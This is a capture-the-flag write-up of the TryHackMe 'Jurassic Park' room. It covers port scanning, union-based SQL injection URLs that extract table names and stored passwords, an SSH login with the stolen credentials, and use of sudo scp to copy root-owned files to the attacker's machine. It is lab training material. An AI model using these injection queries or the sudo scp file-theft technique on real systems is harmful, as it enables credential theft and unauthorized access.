---
title: "Walk-through of Jurassic Park from TryHackMe"
header:
  teaser: /assets/images/2021-01-28-11-39-28.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - SQLi
---

## Machine Information

![jurassic-park](/assets/images/2021-01-28-11-39-28.png)

Jurassic Park is classed as a hard difficulty room on TryHackMe, although the description says it's medium-hard. If you have experience of SQL injection techniques then you should find this room fairly easy. We start by enumerating the web application, eventually using discovered credentials to gain access via SSH. Then we look around the file system to find the hidden flags.

 Skills required are basic knowledge of SQLi, Linux file systems, enumerating ports and services. Skills learned are web application parameter tampering and exploiting poorly configured Linux installations.

If you like CTF style challenges, then you'll enjoy this fun room.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Hard - Jurassic Park](https://tryhackme.com/room/jurassicpark) |
| Machine Release Date | 17th February 2019 |
| Date I Completed It | 27th January 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

While we wait for the box to deploy let's have a quick look at the room description:

![jurassic-intro](/assets/images/2021-01-28-11-44-25.png)

We have a few clues here to help us know where to start:

1. There is a web application running on a port somewhere, make sure we find that with Nmap.
2. There are 4 flags hidden around the file system, make sure we look for hidden files with *ls -lsa*
3. It mentions Dennis in italics, is this a hint at a user?

With the above in mind, let's start with Nmap to check for open ports:

```text
kali@kali:~$ nmap -sC -sV -Pn 10.10.9.16

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 21:40 GMT
Nmap scan report for 10.10.9.16
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d5:96:63:d4:c3:8f:f4:a6:1d:3f:40:7a:15:e7:10:81 (RSA)
|   256 81:be:e5:15:31:43:ff:ca:fa:39:1b:4c:79:1e:51:c8 (ECDSA)
|_  256 15:3b:7f:25:d6:4b:f8:0d:68:bf:b5:f6:cf:f7:4c:b6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have only two open ports on the basic scan. Let's go straight to port 80 with our web browser:

![jurassic-webhome](/assets/images/2021-01-27-21-45-06.png)

We find a simple page with a link to a shop, let's try that:

![jurassic-webshop](/assets/images/2021-01-27-21-45-59.png)

The shop has three packages we can buy, let's go the for best and see what gold gives us:

![jurassic-gold](/assets/images/2021-01-27-22-11-34.png)

We have a static webpage with nothing obvious on it. However, we see in the address bar that the site is using parameters to pull the content of each page from a database.

You can see in the url that there is a parameter id=1:

![jurassic-parameter](/assets/images/2021-01-27-22-12-50.png)

Looking at other pages we see that this changes for each of them. When we try manually incrementing the number *id=5* give us this page:

![jurassic-develop](/assets/images/2021-01-27-22-14-31.png)

It mentions Dennis again so that makes me think it's a clue, possibly a username. Also it's telling us certain characters and words are blocked, maybe this relates to the parameter we've just been playing with.

With the clues so far, it's time to start trying SQL injection. There's lots of great resources out there, this one is quite comprehensive: [payloadbox](https://github.com/payloadbox/sql-injection-payload-list)

Let's try a classic *' or 1=1* to start with and see what we get:

![jurassic-1=1](/assets/images/2021-01-27-22-18-02.png)

Ok, so we can't use an obvious one like the comment character. That is in the list of blocked characters we found before, but at least we know we are looking at SQL injection as our starting point.

Using the order by clause we can find out how many columns the table has by adding one at a time until we get an error. When we get to 6 we see this:

![jurassic-orderby](/assets/images/2021-01-27-22-24-25.png)

Now doing a union statement we can see which fields we will be able to use to view information from the database:

![jurassic-select](/assets/images/2021-01-27-22-28-14.png)

Columns 2, 4 and 5 look to be useable as they are displaying on the page with no additional characters added. Let's see what the database is called:

![jurassic-db](/assets/images/2021-01-27-22-33-52.png)

With the database name we can now find the tables:

```text
http://10.10.9.16/item.php?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()
```

![jurassic-tables](/assets/images/2021-01-27-22-36-45.png)

We have two tables, users and items. Let's look at the users table first, and see what columns are in it:

```text
http://10.10.9.16/item.php?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"
```

![jurassic-columns](/assets/images/2021-01-27-22-41-22.png)

I tried to get the username, but was blocked like before when trying to use the ' character. I can get the passwords though:

```text
http://10.10.9.16/item.php?id=5 union select 1,password,3,4,5 from users
```

![jurassic-password](/assets/images/2021-01-27-22-44-56.png)

So we have the password, but where do we use it? And what could the associated username be?

From the Nmap scan we know there is ssh on port 22. From the developer on ?id=5 we found a possible user dennis. And from the user table we found a password.

So let's try it and see what we find:

```text
kali@kali:~$ ssh dennis@10.10.9.16

The authenticity of host '10.10.9.16 (10.10.9.16)' can't be established.
ECDSA key fingerprint is SHA256:eFy2Vei0QQfyiVQ3CuPAY2EWlK9NbhaHnCzDOotI+O8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.9.16' (ECDSA) to the list of known hosts.
dennis@10.10.9.16's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

dennis@ip-10-10-9-16:~$ 
```

Success! We have been able to log in to ssh as dennis.

First let's look in our current directory. Using ls with the -a parameter shows all files, including hidden ones:

```text
dennis@ip-10-10-9-16:~$ ls -lsa

4 drwxr-xr-x 3 dennis dennis 4096 Jan 27 22:48 .
4 drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
4 -rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
4 -rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
4 -rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
4 drwx------ 2 dennis dennis 4096 Jan 27 22:48 .cache
4 -rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
4 -rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
4 -rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
8 -rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
```

We've found flag 1, let's cat it and register on the thm site:

```text
dennis@ip-10-10-9-16:~$ cat flag1.txt
Congrats on finding the first flag.. But what about the rest? :O
(HIDDEN)
```

There's also a file called test.sh, let's look at that:

```text
dennis@ip-10-10-9-16:~$ cat test.sh
#!/bin/bash
cat /root/flag5.txt
```

We have the location of flag 5, but can't get to that until we are root.

Let's keep looking, another file worth checking is bash_history in case it hasn't been cleared:

```text
dennis@ip-10-10-9-16:~$ cat .bash_history 
Flag3:(HIDDEN))
sudo -l
sudo scp
scp
sudo find
ls
vim test.sh
ls
cd ~
ls
vim test.sh
ls
ls -la
sudo scp -S test.sh
sudo scp /etc/password
sudo scp /etc/password localhost@10.8.0.6@~/
sudo scp /etc/passwd localhost@10.8.0.6@~/
sudo scp /etc/passwd dennis@10.0.0.59@~/
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
sudo scp -v /root/flag5.txt ben@localhost:~/
sudo scp -v /root/flag5.txt dennis@localhost:~/
sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
ping 10.8.0.6
ping 10.8.0.7
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
ls
vim ~/.bash_history
```

Excellent, in there we find flag 3, plus scp has been used a lot, mostly with sudo to copy the flag5.txt file to another host.

This seems suspicious, let's have a look what sudo permissions dennis has:

```text
dennis@ip-10-10-9-16:~$ sudo -l
Matching Defaults entries for dennis on ip-10-10-9-16.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-9-16.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

As expected dennis can use scp as root without needing a password. We can use scp to copy flag5.txt from the root folder. First [start an ssh server](https://www.lmgsecurity.com/enable-start-ssh-kali-linux/) on our local Kali attack machine:

```text
kali@kali:~$ systemctl start ssh.socket
```

Now we can copy the file across:

```text
dennis@ip-10-10-9-16:/home/ubuntu$ sudo scp /root/flag5.txt kali@10.14.6.200:/home/kali
kali@10.14.6.200's password: 
flag5.txt
```

Let's check out the flag:

```text
kali@kali:~$ cat flag5.txt
(HIDDEN)
```

After submitting that flag on the thm site, we need to look for the last one, flag 2.

So far we've only looked in our current directory, which is /home/dennis. Let's look if there are any other users:

```text
dennis@ip-10-10-9-16:~$ cd ..
dennis@ip-10-10-9-16:/home$ ls
dennis  ubuntu

dennis@ip-10-10-9-16:/home$ cd ubuntu/
dennis@ip-10-10-9-16:/home/ubuntu$ ls -lsa
4 drwxr-xr-x 4 ubuntu ubuntu 4096 Mar  6  2019 .
4 drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
4 -rw------- 1 ubuntu ubuntu 1285 Mar  6  2019 .bash_history
4 -rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
4 -rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
4 drwx------ 2 ubuntu ubuntu 4096 Feb 16  2019 .cache
4 -rw------- 1 ubuntu ubuntu  520 Feb 16  2019 .mysql_history
4 -rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
4 drwx------ 2 ubuntu ubuntu 4096 Feb 16  2019 .ssh
0 -rw-r--r-- 1 ubuntu ubuntu    0 Feb 16  2019 .sudo_as_admin_successful
4 -rw------- 1 root   root   3183 Mar  6  2019 .viminfo
```

Interesting to see the .viminfo file owned by root in this users home directory. Let's copy it to our Kali machine using scp like before:

```text
dennis@ip-10-10-9-16:/home/ubuntu$ sudo scp .viminfo kali@10.14.6.200:/home/kali
kali@10.14.6.200's password: 
.viminfo
```

Now we can have a look at the contents of it. At the end of the long file we see this:

```text
# History of marks within files (newest to oldest):
> /etc/ssh/sshd_config
        "       52      25
        ^       52      26
        .       52      25
        +       52      25
> /etc/sudoers
        "       21      38
        ^       21      39
        .       21      27
        +       21      27
> /boot/grub/fonts/flagTwo.txt
        "       1       31
        ^       1       32
        .       1       31
        +       1       31
> /var/www/html/item.php
        "       144     33
        ^       144     34
        .       144     15
        +       144     15
```

We've found flag 2, which has been hidden in the fonts directory. Let's have a look:

```text
ennis@ip-10-10-9-16:/home/ubuntu$ ls -lsa /boot/grub/fonts
total 2356
   4 drwxr-xr-x 2 root root    4096 Feb 16  2019 .
   4 drwxr-xr-x 5 root root    4096 Nov 14  2018 ..
   4 -rw-r--r-- 1 root root      33 Feb 16  2019 flagTwo.txt
2344 -rw-r--r-- 1 root root 2398585 Nov 14  2018 unicode.pf2
```

It's owned by root but world readable. So no need to scp it across, we can just cat and look at the contents:

```text
dennis@ip-10-10-9-16:/home/ubuntu$ cat /boot/grub/fonts/flagTwo.txt
(HIDDEN)
```

That was our last flag, for some reason there is no flag 4!

All done. See you next time.
